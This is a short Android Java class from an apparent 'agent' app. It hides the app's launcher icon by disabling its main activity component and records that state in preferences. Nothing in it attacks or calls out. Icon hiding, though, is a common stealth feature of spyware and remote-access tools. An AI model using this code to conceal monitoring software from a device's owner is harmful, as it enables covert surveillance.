// language: Java, file: FakeHideManager.java, target: Android API 26+
// *launcher icon hide via PackageManager component disable*
package com.rk.agent;

import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;

public class FakeHideManager {

    private static final String PREFS = "cfg";
    private static final String KEY_HIDDEN = "fake_hide";

    public static boolean isHidden(Context ctx) {
        try {
            SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            return sp.getBoolean(KEY_HIDDEN, false);
        } catch (Exception e) {
            return false;
        }
    }

    public static void setHidden(Context ctx, boolean hidden) {
        try {
            SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            sp.edit().putBoolean(KEY_HIDDEN, hidden).apply();

            PackageManager pm = ctx.getPackageManager();
            ComponentName launcher = new ComponentName(ctx, MainActivity.class);

            int newState = hidden
                ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;

            try {
                pm.setComponentEnabledSetting(
                    launcher, newState, PackageManager.DONT_KILL_APP);
            } catch (Exception ignored) {}

        } catch (Exception ignored) {}
    }
              }
